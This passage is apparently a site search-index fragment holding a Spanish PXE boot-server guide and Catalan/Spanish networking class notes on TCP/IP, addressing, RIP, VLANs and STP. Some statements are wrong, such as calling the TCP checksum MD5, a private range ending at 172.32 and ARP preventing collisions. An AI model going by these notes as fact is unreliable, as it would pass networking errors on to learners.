/var/ftp/pub/centos7-x86_64/ sudo umount /tmp/iso # fedora sudo mount -t iso9660 -o loop Fedora-Workstation-netinst-x86_64-27-1.6.iso /tmp/iso sudo cp -arv /tmp/iso/* /var/ftp/pub/fedora27-x86_64/ sudo umount /tmp/iso # borro isos descargadas para liberar espacio rm Fedora-Workstation-netinst-x86_64-27-1.6.iso rm CentOS-7-x86_64-Minimal-1708.iso rm debian-9.2.1-amd64-netinst.iso","title":"Descargar abrir y guardar"},{"location":"administracion/pxe/guiapxe-fedora/#ordenar-tftpboot","text":"Ya con la isos guardadas procedemos a estructurar nuestra carpeta tftpboot, por que tendremos que extraer de cada iso su archivo de iniciaci\u00f3n y el kernel que usan. En el caso de fedora y centos initrd.img y vmlinuz. En debian initrd.gz y vmlinuz. Creo una carpeta para cada distro y dentro su version, para futuras ampliaciones. cd /var/lib/tftpboot mkdir -p /centos/centos7 mkdir -p /debian/stretch mkdir -p /fedora/fedora27 Y de cada uno le a\u00f1adimos su archivo de kernerl e iniciaci\u00f3n cp /var/ftp/pub/centos7-x86_64/isolinux/vmlinuz centos/centos7/ cp /var/ftp/pub/centos7-x86_64/isolinux/initrd.img centos/centos7/ cp /var/ftp/pub/fedora27-x86_64/isolinux/vmlinuz fedora/fedora27/ cp /var/ftp/pub/fedora27-x86_64/isolinux/initrd.img fedora/fedora27/ cp /var/ftp/pub/debian9-x86_64/install.amd/vmlinuz debian/stretch/ cp /var/ftp/pub/debian9-x86_64/install.amd/initrd.gz debian/stretch/ nos quedara el siguente arbol en la carpeta tftpboot [ root@fedora26-virt tftpboot ] # tree . \u251c\u2500\u2500 centos \u2502 \u2514\u2500\u2500 centos7 \u2502 \u251c\u2500\u2500 initrd.img \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 debian \u2502 \u2514\u2500\u2500 stretch \u2502 \u251c\u2500\u2500 initrd.gz \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 fedora \u2502 \u2514\u2500\u2500 fedora27 \u2502 \u251c\u2500\u2500 initrd.img \u2502 \u2514\u2500\u2500 vmlinuz \u251c\u2500\u2500 ldlinux.c32 \u251c\u2500\u2500 mi-menu \u2502 \u251c\u2500\u2500 fondo.jpg \u2502 \u251c\u2500\u2500 ldlinux.c32 \u2502 \u251c\u2500\u2500 libcom32.c32 \u2502 \u251c\u2500\u2500 libutil.c32 \u2502 \u251c\u2500\u2500 menu.cfg \u2502 \u251c\u2500\u2500 reboot.c32 \u2502 \u251c\u2500\u2500 stylosmenu.cfg \u2502 \u2514\u2500\u2500 vesamenu.c32 \u251c\u2500\u2500 pxelinux.0 \u2514\u2500\u2500 pxelinux.cfg \u251c\u2500\u2500 default \u2514\u2500\u2500 vesamenu.c32","title":"Ordenar tftpboot"},{"location":"administracion/pxe/guiapxe-fedora/#editar-menucfg","text":"Ahora que ya tenemos todo ordenado y preparado. Editamos el menu.cfg y a\u00f1adimos las siguientes l\u00edneas: [root@fedora26-virt ~]# cat /var/lib/tftpboot/mi-menu/menu.cfg menu hshift 7 menu width 61 # include define fondo y posicionamieto de menu para reducir l\u00edneas include mi-menu/stylosmenu.cfg menu title Menu PXE rompe pelotas label Arrancar de disco LOCALBOOT 0 TEXT HELP Para arrancar desde el disco duro pulsa Enter. ENDTEXT label Reiniciar menu label ^Reiniciar COM32 reboot.c32 #submenu isos menu begin Imagenes menu label ^Imagenes menu title Imagenes # al ser un submenu hay que poner fondo otra vez y cuadrar texto include mi-menu/stylosmenu.cfg label mainmenu menu label ^Back.. menu exit label Fedora 27 menu label ^Fedora 27 kernel fedora/fedora27/vmlinuz append initrd = fedora/fedora27/initrd.img repo = ftp://192.168.88.243/pub/fedora27-x86_64 label Debian strech menu label ^Debian strech kernel debian/stretch/vmlinuz append initrd = debian/stretch/initrd.gz repo = ftp://192.168.88.243/pub/debian9-x86_64 label Centos 7 menu label ^Centos 7 kernel centos/centos7/vmlinuz append initrd = centos/centos7/initrd.img repo = ftp://192.168.88.243/pub/centos7-x86_64 menu end # fin submenu Con las siguientes l\u00edneas le decimos que inicie con el kernel de linux, inicie la imagen y coja las dependencias de nuestro repositorio ftp. Todo esto hay que tener en cuenta que hemos creado un server ftp con poca seguridad si ponems en el navegador ftp://192.168.88.243 en nmi caso saldra el contenido de la carpeta pub. En entornos lan privados no pasa nada, pero es un dato a tener en cuenta. \u00a1Importante! A mas a mas Fedora tiene un bug que si arrancas con una m\u00e1quina con 1G de ram falla la instalacio\u00f3n , m\u00ednimo a de tener 2G para que funcione bien.","title":"Editar menu.cfg"},{"location":"administracion/pxe/guiapxe-fedora/#ejemplo-imagen","text":"Dejo un par de imagenes para ver como queda.","title":"Ejemplo imagen"},{"location":"administracion/redes/apuntes-xarxa/","text":"APUNTS DE XARXES Capa de Aplicaci\u00f3 OSI i TCP/IP Model OSI Model TCP/IP 7. Aplicaci\u00f3 Aplicacio 6. Presentacio 5. Sesio 4. Transport Transport 3. Red Internet 2. Enlla\u00e7 de dades Acces a la xarxa 1. Fisica \u200b Funcio model TCP/IP Capa Protocol Dades Relatioves Funci\u00f3 Acces a la xarxa Ethernet MAC Trama Internet IP IP Paquet Transport TCP/UDP Port Segment/Datagrama Aplicaci\u00f3 http/s, ftp... Dades Aplicacions i serveis Aplicacions: Les aplicacions en aquesta capa les utilitzan les persones, son tipos navegador, skype, ect... El serveis: Molts dels servers sidentifican en aquesta capa: BBDD, ftp, DNS, Web, DHCP, etc... Capa de Transport La capa de transport treballa a nivell de port, amb el protocol TCP/UDP la seva funcio es segmentar les dades que l'arriben de la capa aplicaci\u00f3. Protocol TCP: segment UDP: datagrama Funci\u00f3 Permetre m\u00faltiples conexions. Gracies a la segmentacio i a la distribucio de ports pot fer arrivar a diferents aplicaci\u00f3n informacio a l'hora pel seu correcte funcionament fent multiples converse al mateix temps. aixo s'anomena Multiplexaci\u00f3 . Assegurar que les dades arriven correctament: Amb el protocol TCP i el seu flag ACK, permet asegurarse de larribada de cada paquet enviat. Gestionar els errors posibles: Windows Size Value: Ens permet saber quantes dades pot rebre un dispositiu sense col\u00b7lapsar-se. Control de Fluxe: Amb el valor de la finestra Window Size Value, el TCP pot gestionar el m\u00e0xim d'enviament de dades possible segons les capacitats del medi i dels dispositius que hi est\u00e1n participant, \u00e9s a dir, adapta la velocitat d'enviament a la capacitat del dispositiu final o a l'estat del medi per on s'hi transmeten. Checksum Es una operaci\u00f3 matem\u00e0tica de manera que molta informaci\u00f3 l'agrupem a un nombre molt petit L'objectiu \u00e9s saber si la transferencia s'ha fet correctament, no \u00e9s 100% fiable ja que la simplificaci\u00f3 potser no \u00e9s perfecte per\u00f2 si que \u00e9s molt aproximada. 1500 Bytes --> 8 Bytes Si el checksum no coincideix en res vol dir que no s'ha rebut b\u00e9 el paquet hi ha hagut algun error. L'algoritme \u00e9s diu MD5. Relaci\u00f3 entre els n\u00fameros dels paquets. TCP Segment Lenght + Sequence Number = Next Sequence Number netstat -putona Mostra informaci\u00f3 dels Shockets actius / connexions totals del sistema. -p programa -u udp -t tcp -n nombre de ports --> numeric, HTTP NO, 80 SI. -a Tots els processos nc o netcat nc -lv 1500 --> Escolta i espera una connexi\u00f3 per el port 1500 nc 192.168.3.8 1500 --> Intenta connectar-se a aquella IP i per aquell port. Contingut d'una direcci\u00f3 web http://www.google.com:1500/index.html protocol, nom de domini, port, recurs o p\u00e0gina. Flags del protocol TCP URG: Indica que el segment URGENT ACK: Indica que el segment es un av\u00eds de rebut (Acknowlegment) PSH: Indica que la petici\u00f3 que a fet no la apili al bufer i laprocesi de forma mes inmediata posible ( demana l'enviament del segment (push) ). RST: Indica que el segment demana reiniciar la sessi\u00f3 (reset) SYN: Indica que el segment demana fer una sincronitzaci\u00f3 del numero de seq\u00fc\u00e8ncia entre els dispositius origen i dest\u00ed (syncronization) FIN: indica que el segment demana finalitzar la sessi\u00f3 Sincronitzaci\u00f3 Al fer una sincronitzaci\u00f3 el que realment estem fent es establir un n\u00famero de secuencia. tamb\u00e9 sestableix el socket ip:port local ip:port dest\u00ed. Capa d'Internet TCP/IP o de Xarxa OSI Rep les dades de la capa de transport: Encapsula Crea la PDU que en aquest cas s'anomena PAQUET Les envia a la capa d'acc\u00e9s a la xarxa. Rep les dades de la capa d'acc\u00e8s a la xarxa: Fa la mateixa operaci\u00f3 per\u00f2 a l'inversa. Funcions Identifica tots els dispositius amb una IP Enruta les dades per tal que aquestes arribin al dest\u00ed de manera correcta. IPv4 \u00c9s independent de les dades que transporta, \u00e9s a dir, que ignora l'aplicaci\u00f3 que les ha generat o el significat que tenen. Tamb\u00e9 \u00e9s independent del medi, cablejat, WIFI o llum, tot i que la mida m\u00e0xima del paquet si que depen del medi. (Exemple: Ethernet 1500B, WLAN 2304B) Dades m\u00e9s rellevants a la cap\u00e7alera Adre\u00e7a origen i dest\u00ed TTL --> Time To Live, quantitat de routers per els quals el paquet pot passar fins que al final es destrueixi. Comanda: Traceroute, mostra tots els routers per els quals passa un paquet fins que arriba al dest\u00ed possible o ha passat per 30 routers. Envia un paquet amb TTL 1, aleshores torna a enviar un amb TTL 2, fins que no deixa de rebre avisos conforme els paquets es destrueixen va enviant i sumant TTL fins al final quedar la quantitat de routers per la qual ha passat el paquet. Ho intenta 3 vegades per router, en cas de que falli alg\u00fan d'aquests hi afegeix un . Tamb\u00e9 pot ser que el router no estigui configurat per a identificar-se i per aix\u00f2 al no donar la seva informaci\u00f3 traceroute afegeix * *. Versi\u00f3 4 o 6. Protocol de la capa superior (Transport, TCP o UDP) Checksum, per comprovar que no hi hagin errors. Switch VS Router Switch Treballa a la capa 2 del model OSI (Enlla\u00e7 de dades), amb les MAC, nomes pot manipular trames amb origen i dest\u00ed dins de la mateixa LAN. Router Treballa a la capa 3 del model OSI (Xarxa), amb les IP, enruta paquets entre xarxes diferents, permet sortir a altres xarxes com a gateway o porta d'enlla\u00e7. ip r Ens mostra el nostre gateway configurat per defecte. MAC La MAC nom\u00e9s t\u00e9 sentit utilitzar-la dins de la meva xarxa local. A tenir en compte El GATEWAY ha d'estar a la mateixa xarxa que el dispositiu Les IP han de coincidir en el rang d'adreces de xarxa Cada dispositiu ha de saber quin \u00e9s el seu gateway (Manualment o amb DHCP) Cada router ha de seaber com redirigir una adre\u00e7a IP (Taules d'enrutament) Els routers entre ells creen una xarxa sense dispositius finals Comandes b\u00e0siques [isx46420653@j07 Xarxes]$ ip a 2: enp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 14:da:e9:b6:e5:13 brd ff:ff:ff:ff:ff:ff inet 192.168.3.7/16 brd 192.168.255.255 scope global dynamic enp2s0 valid_lft 12863sec preferred_lft 12863sec inet6 fe80::16da:e9ff:feb6:e513/64 scope link valid_lft forever preferred_lft forever [isx46420653@j07 Xarxes]$ ip route default via 192.168.0.1 dev enp2s0 proto static metric 100 192.168.0.0/16 dev enp2s0 proto kernel scope link src 192.168.3.7 metric 100 [isx46420653@j07 Xarxes]$ route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default router.informat 0.0.0.0 UG 100 0 0 enp2s0 192.168.0.0 0.0.0.0 255.255.0.0 U 100 0 0 enp2s0 Tipus d'enrutament Manual Implica que qualsevol canvi a la xarxa obliga a modificar els taules d'enrutament Autom\u00e0tic Els routers es comuniquen entre ells per a saber on enviar la informaci\u00f3 i per quin cam\u00ed pot ser m\u00e9s r\u00e0pid, utilitzen el RIP (Routing Information Protocol) que \u00e9s el m\u00e9s utilitzat. Adre\u00e7ament ip En totes les xarxes n'hi h'an 2 ip que no es poden utilitzar: la mes petita ( la de xarxa ) la mes gran ( la de brodcast ) Broadcast existeixen 2 tipus de brodcast Dirigit: quan enviem el misatge bradcast a un altre xarxa, cal configurar el ruter perque es permeti. Limitada: limitada a la propia xarxa, els rutes descarten l'enrutament dels missatges dirigits a aquesta ip. Rangs ip's Dispositius: 0.0.0.0 a la 223.255.255.255 Multicast: 224.0.0.0 a la 239.255.255.255 Experimentals: 240.0.0.0 a la 255.255.255.254 Privades Poden repetirse entre diferents xarxes locals, i mai surten de la xarxa local, si cal sortir s'utilitzara un NAT o PAT. Publiquers Dispositius que han de sortir a internet, principalment routers o servidors. Adreces especials Son les adreses que no es poden asignar a un dispositiu. adreses de xarxa o brodcast rutes per defecte (0.0.0.0/0) les que s'utilitcen en les taules d'enrutament com a opci\u00f3 per defecte. loopback (127.0.0.0/8) es una ip reservada per enviarse trafic a si mateix. D'enlla\u00e7 local En xarxas punt a punt o quan no hem obtungut adrea\u00e7a DHCP Classes Classe A de 0.0.0.0/8 a 127.0.0.0/8 xarxes grans 16\u00b710**6 dispositius En la seva representaci\u00f3 binaria sempre comencen per 0 Classe B de 128.0.0.0/16 a 191.255.0.0/16 xarxes mitjanes-grans 65000 dispositius En la seva representaci\u00f3 binaria sempre comencen per 10 Classe C de 192.0.0.0/24 a 223.255.255.255/24 xarxes petites 254 dispositius En la seva representaci\u00f3 binaria sempre comencen per 0 Classfull .... Divisio subxarxes A partir duna xarxa mare, podem agafar bits a la part de hosts per crear subxarxes. El numero de subxarxes depen del n\u00famero de bits que agafas. Exemple: xarxa mare: 192.168.4.0/24, si agafem 2 bits 192.168.4.0/26 amb 2**2 podem fer 4 subxarxes. 00 01 10 11 Capa acceso a la red interactua con dos capas del modelo OSI, capa enlace de datos y f\u00edsica. Enlace de datos: interactua con la capa de internet obtiene el paquete lo encapsula y crea una nueva PDU denominada trama, el dato mas importante que a\u00f1ade es la vmac origen y destino. F\u00edsica: codifica/descodifica los bits seg\u00fan el medio. impulsos electricos, ondas electromagneticas o luz. El objetivo de la capa f\u00edsica es crear o interpretar las se\u00f1ales que representan los bits de la trama. Mac La mac es una direcci\u00f3n del protocolo internet, identifica de forma unica una interficie de red, en principo no la podemos cambiar al estar grabada en la ROM de la NIC. las comunicaciones dentro de una misma red se realizan mediante la mac, por tanto necesitamos el protocolo ARP. ARP, permet la comunicaci\u00f3 mitjan\u00e7ant un protocol Adress Resolution Protocol --> Troba la direcci\u00f3 MAC que correspon a una IP El protocolo ARP hace la traducci\u00f3n de ip a mac, lo hace mandando un brodcast en formato MAC y solo respondera el que tiene la ip asociada a esa mac especifica. esta la guarda en una cache para en futuras conexiones no tener que repetir el proceso. arp comando parta ver la cache. Est\u00e0ndards Hi han uns determinats est\u00e0ndards que permeten que diversos elements de diversos fabricants puguin ser compatibles entre ells. Ethernet: Connector RJ45 i el medi \u00e9s el UTP, Unshielded TwistedPair o Parell Trenat (de coure) UTP amb RJ45: 10BASE-T (10Mbps) 100BASE-TX (100Mbps) 1000BASE-T (1Gbps) Wireless: Bluetooth 502.15 --> Velocitats baixes <1 Mbps, dist\u00e0ncies curtes i entre dispositius propers. 802.11 (a,b,g,n) --> Velocitats altes(fins a 54 Mbps), dist\u00e0ncies mitjanes, popularment \u00e9s el Wi-Fi. GSM,GPRS,3G i 4G --> Dist\u00e0ncies llargues, s'utilitzen als m\u00f2bils. Hem de tenir en compte que existeixen les interfer\u00e8ncies, ja siguin en medis wireless o en medis cablejats. Interficies Cables El cable mas habitual es UTP Unshielded ( desprotegido ) o Parell trenat ( de cobre ) Este cable no tiene mucho rebestimiento para evitar interferencias. El formato de creaci\u00f3n actualmente es el directo, los 2 extremos seran iguales. Antiguamente en una conexi\u00f3n dfe host a host, se utilizaba un cable cruzado para que no coincida salida con salid o entrada con entrada. Hoy en dia las targetas de red ya reconocen las entradas y salidas y las reordenan automaticamente. STP Es un cable UTP con un blindage extra para minimizar interferencias Fibra Ancho de banda alto y distancias de mas de 100m Inalambrico Bluethooth Bajo consumo de energ\u00eda, distancias cortas, frecuencia baja. Wifi 802.11 (a,b,g,n) Velocidades altas ( de 54 Mbps a 5 Gbps) , distancias medianas Planificaci\u00f3 i Administraci\u00f3 de Xarxes Adre\u00e7ament ip Adre\u00e7a de Xarxa AX = Adrea\u00e7a de xarxa MX = M\u00e0scara de Xarxa AX = IP AND MX Exemple: IP --> 10.10.10.65/26 MX --> 255.255.255.192 AX --> 10.10.10.64 Adre\u00e7a de Broadcast \u00c9s la \u00faltima adre\u00e7a disponible de la xarxa, la m\u00e9s gran. S'utilitza per a enviar missatges a TOTS els dispositius d'una xarxa. A la pr\u00e0ctica, tots els bits de host s\u00f3n 1. AB = adre\u00e7a de broadcast AB = IP OR (NOT MX) Exemple (Octets perfectes): IP --> 10.10.10.7/24 MX --> 255.255.255.0 AX --> 10.10.10.0 AB --> 10.10.10.255 Exemple (Octets imperfectes): Recordar: (A la pr\u00e0ctica, tots els bits de host s\u00f3n 1.) IP --> 10.10.10.7/26 MX --> 255.255.255.192 AX --> 10.10.10.0 AB --> 10.10.10.63 Comunicaci\u00f3 de dispositius Unicast: Comunicaci\u00f3 entre 2 dispositius Broadcast: Comunicaci\u00f3 amb tota la xarxa. Dirigit: que enviem el missatge broadcast a una altra xarxa ( sutilitza ip de la xarxa externa ) limitat: en la propia xarxa Multicast: Comunicaci\u00f3 amb un conjunt de dispositius. s'hi ha de tenir un grup multicast asignat, en un rang d'adresses 224.0.0.0 a la 239.255.255.255. Els clients que participen en el grup tenen dues adresses, la seva i la multicast. Rang d'adre\u00e7es IP De dispositius: Van de la 0.0.0.0 a la 223.255.255.255 Multicast: 224.0.0.0 a la 239.255.255.255 Experimentals: 240.0.0.0 a la 255.255.255.254 Classificaci\u00f3 d'adre\u00e7es IP Privades : Poden repetir-se dins de les xarxes locals, i mai surten d'ella. Existeixen 3 rangs: (Est\u00e0ndard) Xarxes grans: 10.0.0.0/8 a 10.255.255.255 Xarxes mitjanes: 172.16.0.0/12 a 172.32.255.255 Xarxes petites: 192.168.0.0/16 a 192.168.255.255 P\u00fabliques: Han de sortir a internet, normalment les tenen els routers o servidors, s\u00f3n \u00faniques. Adreces especials: Adreces de xarxa o Broadcast, la 0.0.0.0/8 \u00e9s la ruta per defecte el 127.0.0.0/8 \u00e9s el loopback la 169.254.0.0/16 \u00e9s la d'enlla\u00e7 local, en xarxes P2P o quan no hem obtingut adre\u00e7a del DHCP. Classes d'IP Classe A : Xarxes MOLT grans, permeten 16*10**6 dispositius, van de la 0.0.0.0/8 a la 127.0.0.0/8, en binari sempre comencen per 0. Classe B: Xarxes mitjanes, permeten uns 65000 dispositius, van de la 128.0.0.0/16 a la 191.255.0.0/16, en binari sempre comencen per 10. Classe C: Xarxes petites, permeten uns 254 dispositius, van de la 192.0.0.0/24 a la 223.255.255.255/24, en binari sempre comencen per 110. Assignaci\u00f3 d'IP IANA es l'organisme encarregat d'assignar ip's A dia d'avui l'assignaci\u00f3 la delega als RIR , els RIR assignen les IP disponibles als ISP de la zona, que les distribueixen als seus clients. Resum de rutes Per no haver d'afegir 2 entrades a la taula d'enrutament podem fer: 192 .168.1.0/24 192 .168.2.0/24 x.x.00000001.x x.x.00000010.x L'entrada 192.168.0.0/22 afecta a les xarxes 192.168.1.0, 192.168.2.0 i 192.168.3.0, tenint en compte que totes elles surten per la mateixa interf\u00edcie. Alguns routers tenen en compte sempre la m\u00e0scara de xarxa m\u00e9s alta, de manera que si hi han 2 entrades a la taula d'enrutament amb la mateixa IP, una resumida i l'altra individual, el router funcionar\u00e0 amb l'entrada individual perqu\u00e8 la m\u00e0scara \u00e9s m\u00e9s gran. Exemple: 192.168.0.0/22 192.168.x.x 192.168.3.0/24 192.168.x.x --> Aquesta t\u00e9 prioritat al router. Enrutamentamiento Rip Rip es un protocolo para enrutar dinamicamente, esto se produce en mensages tipo broadcast que envian los routes. En dicho mensage cada router envia que redes tiene e sus interficies, y van rellenando las tablas de enrutamientos con ellas. versi\u00f3n 1: classful , acepta subneting pero no superneting. clasful se basa en clases de ip por lo tanto es incapaz de enrutar redes con superneting. version 2: lessful, envia ip con mascara auto-summary : Es la opcion por defecto, crea resumen de rutas. no auto-sumary : No crea resumen de rutas, en ocasiones hay que habilitarlo para evitar alg\u00fan conflicto con el resumen de rutas. Tanto la versi\u00f3n 1 como la 2, a no ser que este el auto-summary desactivado el protocolo rip ar\u00e1 resumenes de rutas automaticamente. Switches Un switch trabaja con macs en protocolo ARP, capa 2 modelo tcp/ip. El protocolo ARP evita colisiones segmentando cada paquete y redirigiendolo al dispositivo pertinente. El switch es la actualizaci\u00f3n de hub donde el hub es un replicador de datos y el switch redirige cada mensage por la interfaz concreta. hub capa1, switch capa 2. switch evita colisiones en la medida de lo posible. opcion1: utilizada por el hub, CSMA/CD, espera a que la linea quede bacia para poder transmitir. opcion2: utilizada por switch, Segmentaci\u00f3n de paquetes junto al protocolo ARP, para distribuir cada segmento al dispositivo indicado. mirroring port : Es una practica para detectar todos los paquetes entrantes y salientes de una red, consiste en conectarse por encima de la conexi\u00f3n del switch y as\u00ed poder recibir todos los paquetes entrantes y salientes. Metodo sticky: convierte asignacion mac de arp dinamica en est\u00e1tica Spanning Tree Protocol: Es un protocolo de switches que evita la tormenta de broadcast. CSMA/CD Es un mecanismo que incorporan algunos dispositivos, y funciona que si en un medio f\u00edsico se quieren transmitir datos se escucha y se espera a que el medio este libre para transmitir. csma/cd no segmenta las tramas. Dominio de colisi\u00f3n Es un grupo de dispositivos conectados al mismo medio f\u00edsico, de tal manera que si dos dispositivos acceden al mismo medio a la vez se produce una colision. Dominio de difusi\u00f3n Un dominio de difusi\u00f3n englova todos los dispositivos de una LAN o VLAN, es el area donde puede acceder un broadcast. Administraci\u00f3n Avanzada de Redes Vlan Una vlan sirve para dividir una red en m\u00faltiples redes y as\u00ed poder romper un \u00e1rea de dominio de difusi\u00f3n en m\u00faltiples de colisi\u00f3n. La ventaja es que no necesitamos un router para la divisi\u00f3n de redes, si no que el mismo switch puede hacer estas divisiones, as\u00ed ahorrando costes y con un mayor rendimiento. La vlan por defecto ( nativa ) es la 1 a\u00fan que se puede modificar al gusto. Funciona en 2 pasos: crear las vlan identific\u00e1ndolas con un n\u00famero Asignando la interficie a la vlan Enlaces Troncales Los enlaces troncales se asignan a interficies entre dos switches o de switch a router, en la que se comunicaran diferentes vlans por la misma interficie. Si no existiese este tipo de enlace se tendr\u00eda que conectar dos dispositivos tantas veces como vlans tuviera configuradas. 802.1Q ( DOT1Q) En los enlaces troncales se asigna una etiqueta o tagged para diferenciar las tramas que pertenecen a cada vlan, en caso de que no fuera as\u00ed el switch no podr\u00eda saber que trama pertenece a que vlan. Las tramas de la vlan nativa son las \u00fanicas que pasan por el enlace trunck sin la etiqueta adicional dot1q Enrutamiento Vlan En el modo tradicional cada vlan tiene que estar conectado a una interficie del router pero esto consume muchas interficies y no es rentable, por eso se combina modo trunk (router on a stick) con el tradicional seg\u00fan nuestras necesidades. Router On A Stick Se configura una interficie que acepte diversas vlan. #Creaci\u00f3 de la interf\u00edcie 10 associada a la fa0/0 Router ( config ) # interface fa0/0.10 Router ( config-subif ) # encapsulation dot1q 10 Router ( config-subif ) # ip address 192.168.1.129 255.255.255.224 Router ( config ) # interface fa0/0.20 Router ( config-subif ) # encapsulation dot1q 20 Router ( config-subif ) # ip address 192.168.1.65 255.255.255.224 Router ( config ) # interface fa0/0 Router ( config ) # no shutdown En este caso la interface 0/0 englova 2 vlans la 10 y la 20. Pros y Contras Tradicional: utiliza muchas interficies f\u00edsicas. cada vlan tiene todo el ancho de banda de la interficie Stick: se puede gestionar muchas vlan en pocas interficies todas las vlan de la misma interficie comparten ancho de banda STP Stp ( Spanning Tree Protocol ), tiene la funci\u00f3n de gestionar bucles en topolog\u00edas de red, evitando tormentas de broadcast. El protocolo permite a los dispositivos activar o desactivar autom\u00e1ticamente los enlaces de red. El protocolo establece un switch como ra\u00edz ( Root Bridge ) y los dem\u00e1s switch de la topolog\u00eda establecen la ruta mas corta hacia la ra\u00edz como Root Port, en el extremo contrario del enlace de Root Port siempre estar\u00e1 Designed Port. En el caso de que en un enlace no haya ning\u00fan RP, por lo tanto queda un enlace con dos extremos DP designed port, en el que tenga la mac mas alta se establecer\u00e1 como BP blocked port para evitar bucles. El Root Bridge se establece en el switch que tiene la mac mas baja en la vlan en uso, esta prioridad de ra\u00edz es modificable mediante comandos al router deseado.","title":"APUNTS DE XARXES"},{"location":"administracion/redes/apuntes-xarxa/#apunts-de-xarxes","text":"","title":"APUNTS DE XARXES"},{"location":"administracion/redes/apuntes-xarxa/#capa-de-aplicacio","text":"","title":"Capa de Aplicaci\u00f3"},{"location":"administracion/redes/apuntes-xarxa/#osi-i-tcpip","text":"Model OSI Model TCP/IP 7. Aplicaci\u00f3 Aplicacio 6. Presentacio 5. Sesio 4. Transport Transport 3. Red Internet 2. Enlla\u00e7 de dades Acces a la xarxa 1. Fisica \u200b","title":"OSI i TCP/IP"},{"location":"administracion/redes/apuntes-xarxa/#funcio-model-tcpip","text":"Capa Protocol Dades Relatioves Funci\u00f3 Acces a la xarxa Ethernet MAC Trama Internet IP IP Paquet Transport TCP/UDP Port Segment/Datagrama Aplicaci\u00f3 http/s, ftp... Dades","title":"Funcio model TCP/IP"},{"location":"administracion/redes/apuntes-xarxa/#aplicacions-i-serveis","text":"Aplicacions: Les aplicacions en aquesta capa les utilitzan les persones, son tipos navegador, skype, ect... El serveis: Molts dels servers sidentifican en aquesta capa: BBDD, ftp, DNS, Web, DHCP, etc...","title":"Aplicacions i serveis"},{"location":"administracion/redes/apuntes-xarxa/#capa-de-transport","text":"La capa de transport treballa a nivell de port, amb el protocol TCP/UDP la seva funcio es segmentar les dades que l'arriben de la capa aplicaci\u00f3.","title":"Capa de Transport"},{"location":"administracion/redes/apuntes-xarxa/#protocol","text":"TCP: segment UDP: datagrama","title":"Protocol"},{"location":"administracion/redes/apuntes-xarxa/#funcio","text":"Permetre m\u00faltiples conexions. Gracies a la segmentacio i a la distribucio de ports pot fer arrivar a diferents aplicaci\u00f3n informacio a l'hora pel seu correcte funcionament fent multiples converse al mateix temps. aixo s'anomena Multiplexaci\u00f3 . Assegurar que les dades arriven correctament: Amb el protocol TCP i el seu flag ACK, permet asegurarse de larribada de cada paquet enviat. Gestionar els errors posibles:","title":"Funci\u00f3"},{"location":"administracion/redes/apuntes-xarxa/#windows-size-value","text":"Ens permet saber quantes dades pot rebre un dispositiu sense col\u00b7lapsar-se.","title":"Windows Size Value:"},{"location":"administracion/redes/apuntes-xarxa/#control-de-fluxe","text":"Amb el valor de la finestra Window Size Value, el TCP pot gestionar el m\u00e0xim d'enviament de dades possible segons les capacitats del medi i dels dispositius que hi est\u00e1n participant, \u00e9s a dir, adapta la velocitat d'enviament a la capacitat del dispositiu final o a l'estat del medi per on s'hi transmeten.","title":"Control de Fluxe:"},{"location":"administracion/redes/apuntes-xarxa/#checksum","text":"Es una operaci\u00f3 matem\u00e0tica de manera que molta informaci\u00f3 l'agrupem a un nombre molt petit L'objectiu \u00e9s saber si la transferencia s'ha fet correctament, no \u00e9s 100% fiable ja que la simplificaci\u00f3 potser no \u00e9s perfecte per\u00f2 si que \u00e9s molt aproximada. 1500 Bytes --> 8 Bytes Si el checksum no coincideix en res vol dir que no s'ha rebut b\u00e9 el paquet hi ha hagut algun error. L'algoritme \u00e9s diu MD5.","title":"Checksum"},{"location":"administracion/redes/apuntes-xarxa/#relacio-entre-els-numeros-dels-paquets","text":"TCP Segment Lenght + Sequence Number = Next Sequence Number","title":"Relaci\u00f3 entre els n\u00fameros dels paquets."},{"location":"administracion/redes/apuntes-xarxa/#netstat-putona","text":"Mostra informaci\u00f3 dels Shockets actius / connexions totals del sistema. -p programa -u udp -t tcp -n nombre de ports --> numeric, HTTP NO, 80 SI. -a Tots els processos","title":"netstat -putona"},{"location":"administracion/redes/apuntes-xarxa/#nc-o-netcat","text":"nc -lv 1500 --> Escolta i espera una connexi\u00f3 per el port 1500 nc 192.168.3.8 1500 --> Intenta connectar-se a aquella IP i per aquell port.","title":"nc o netcat"},{"location":"administracion/redes/apuntes-xarxa/#contingut-duna-direccio-web","text":"http://www.google.com:1500/index.html protocol, nom de domini, port, recurs o p\u00e0gina.","title":"Contingut d'una direcci\u00f3 web"},{"location":"administracion/redes/apuntes-xarxa/#flags-del-protocol-tcp","text":"URG: Indica que el segment URGENT ACK: Indica que el segment es un av\u00eds de rebut (Acknowlegment) PSH: Indica que la petici\u00f3 que a fet no la apili al bufer i laprocesi de forma mes inmediata posible ( demana l'enviament del segment (push) ). RST: Indica que el segment demana reiniciar la sessi\u00f3 (reset) SYN: Indica que el segment demana fer una sincronitzaci\u00f3 del numero de seq\u00fc\u00e8ncia entre els dispositius origen i dest\u00ed (syncronization) FIN: indica que el segment demana finalitzar la sessi\u00f3","title":"Flags del protocol TCP"},{"location":"administracion/redes/apuntes-xarxa/#sincronitzacio","text":"Al fer una sincronitzaci\u00f3 el que realment estem fent es establir un n\u00famero de secuencia. tamb\u00e9 sestableix el socket ip:port local ip:port dest\u00ed.","title":"Sincronitzaci\u00f3"},{"location":"administracion/redes/apuntes-xarxa/#capa-dinternet-tcpip-o-de-xarxa-osi","text":"Rep les dades de la capa de transport: Encapsula Crea la PDU que en aquest cas s'anomena PAQUET Les envia a la capa d'acc\u00e9s a la xarxa. Rep les dades de la capa d'acc\u00e8s a la xarxa: Fa la mateixa operaci\u00f3 per\u00f2 a l'inversa.","title":"Capa d'Internet TCP/IP o de Xarxa OSI"},{"location":"administracion/redes/apuntes-xarxa/#funcions","text":"Identifica tots els dispositius amb una IP Enruta les dades per tal que aquestes arribin al dest\u00ed de manera correcta.","title":"Funcions"},{"location":"administracion/redes/apuntes-xarxa/#ipv4","text":"\u00c9s independent de les dades que transporta, \u00e9s a dir, que ignora l'aplicaci\u00f3 que les ha generat o el significat que tenen. Tamb\u00e9 \u00e9s independent del medi, cablejat, WIFI o llum, tot i que la mida m\u00e0xima del paquet si que depen del medi. (Exemple: Ethernet 1500B, WLAN 